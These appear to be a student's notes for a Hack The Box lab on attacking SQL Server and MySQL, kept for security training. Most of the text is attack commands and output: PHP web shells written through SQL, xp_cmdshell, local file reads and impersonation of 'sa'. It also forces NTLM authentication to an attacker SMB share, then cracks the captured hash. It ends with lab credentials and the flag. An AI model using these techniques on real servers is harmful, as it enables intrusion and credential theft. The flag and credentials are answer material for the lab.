# Attacking SQL Databases

## Enumeration

nmap -Pn -sV -sC -p1433 $TARGET

## Authentication Mechanisms

MSSQL supports 2 authentication modes :
- Windows authentication mode : Active Directory
- Mixed mode : Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server.

-> CVE-2012-2122 in MySQL 5.6.x

## Misconfigurations
Access the service without credentials if anonymous access is enabled,

## Privileges

Read or change the contents of a database

Read or change the server configuration

Execute commands

Read local files

Communicate with other databases

Capture the local system hash

Impersonate existing users

Gain access to other networks

## Protocol Specific Attacks

Connecting :

Linux :
mysql -u julio -pPassword123 -h $TARGET
sqsh -S $TARGET -U julio -P 'MyPassword!' -h
mssqlclient.py -p 1433 julio@$TARGET

When using Windows authentication, spexify the domain (here .)
sqsh -S $TARGET -U .\\julio -P 'MyPassword!' -h

Windows :
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

## Interaction

mysql> 

SHOW DATABASES;
USE htbusers;
SHOW TABLES;
SELECT * FROM users;
***Execute commands***
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
show variables like "secure_file_priv";
***Read local files***
select LOAD_FILE("/etc/passwd");

sqlcmd :
SELECT name FROM master.dbo.sysdatabases
GO
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
SELECT * FROM users
go
***Execute commands***
xp_cmdshell 'whoami'
GO
***Execute procedures***
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
***Create file***
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
***Read local files***
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO

## Capture MSSQL Service Hash

EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO

sudo responder -I tun0
OR
sudo impacket-smbserver share ./ -smb2support

## Impersonate Existing Users with MSSQL

### Identify Users that We Can Impersonate :

SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

name
-----------------------------------------------
sa
ben
valentin

### Verifying our Current User and Role

SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)

0 -> we don't have sysadmin Role

### Impersonating the SA User

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)

## Communicate with Other Databases with MSSQL

SELECT srvname, isremote FROM sysservers
GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

## LAB

Authenticate to 10.129.235.219 with user "htbdbuser" and password "MSSQLAccess01!"

nmap -Pn -sV -sC -p1433 $TARGET

1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-14T15:48:43
|_Not valid after:  2053-11-14T15:48:43
|_ssl-date: 2023-11-14T16:09:00+00:00; 0s from scanner time.

mssqlclient.py -p 1433 htbdbuser@$TARGET
MSSQLAccess01!

SQL (htbdbuser  guest@master)> select name from sys.databases
name      
-------   
master    

tempdb    

model     

msdb      

hmaildb   

flagDB    

USE hmaildb;
USE flagDB;

The server principal "htbdbuser" is not able to access

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO

select @@version;

SELECT name FROM master.dbo.sysdatabases;

USE master
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'


SELECT * FROM master.INFORMATION_SCHEMA.TABLES;

SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME         TABLE_TYPE   
-------------   ------------   ----------------   ----------   
master          dbo            spt_fallback_db    b'BASE TABLE'   

master          dbo            spt_fallback_dev   b'BASE TABLE'   

master          dbo            spt_fallback_usg   b'BASE TABLE'   

master          dbo            spt_values         b'VIEW'      

master          dbo            spt_monitor        b'BASE TABLE'   

SELECT * FROM spt_monitor

select * from sys.database_principals;

select name,type_desc as type,authentication_type_desc as authentication_type,sid from sys.database_principals where type not in ('A', 'R') order by name;

name                 type       authentication_type     sid   
------------------   --------   -------------------   -----   
dbo                  SQL_USER   INSTANCE              b'01'   

guest                SQL_USER   NONE                  b'00'   

INFORMATION_SCHEMA   SQL_USER   NONE                   NULL   

sys                  SQL_USER   NONE                   NULL   

EXEC sp_helpuser

EXECUTE AS LOGIN = 'mssqlsvc'

EXEC master..xp_dirtree '\\10.10.14.33\share\'

[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:3e24739ce5810e6f:35E73C3784B9C29D1D520CC486C1AC97:0101000000000000805DC2506217DA014EC53C561A9670C400000000020008004B004D004A00330001001E00570049004E002D00310053004A00310050005A005100580034003800530004003400570049004E002D00310053004A00310050005A00510058003400380053002E004B004D004A0033002E004C004F00430041004C00030014004B004D004A0033002E004C004F00430041004C00050014004B004D004A0033002E004C004F00430041004C0007000800805DC2506217DA01060004000200000008003000300000000000000000000000003000007E96453B9C6CAE910A592CBCBD61234DB6EF4ECE31BFF64F82A82BEDC0FBFAEF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330033000000000000000000

sudo hashcat -m 1000 35E73C3784B9C29D1D520CC486C1AC97 /usr/share/wordlists/rockyou.txt
john --format=mssql12 --wordlist=pass hash.txt
sudo hashcat -m 0 35E73C3784B9C29D1D520CC486C1AC97 /usr/share/wordlists/rockyou.txt
sudo hashcat -m 3000 3e24739ce5810e6f /usr/share/wordlists/rockyou.txt
sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
sudo hashcat -m 1000 3e24739ce5810e6f /usr/share/wordlists/rockyou.txt
sudo hashcat -m 1000 35E73C3784B9C29D1D520CC486C1AC97 password.list
3e24739ce5810e6f
hashcat -m 5600 -a 0 hash.txt password.list
hashcat -a 0 -m 5600 hashes.txt password.list
hashcat -a 0 -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

princess1

mssqlclient.py -p 1433 mssqlsvc@$TARGET -windows-auth
princess1

SQL (WIN-02\mssqlsvc  guest@master)> USE flagDB;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.

SELECT * FROM flagDB.INFORMATION_SCHEMA.TABLES;

TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
flagDB          dbo            tb_flag      b'BASE TABLE'  

SELECT * from tb_flag
flagvalue                              
------------------------------------   
b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   
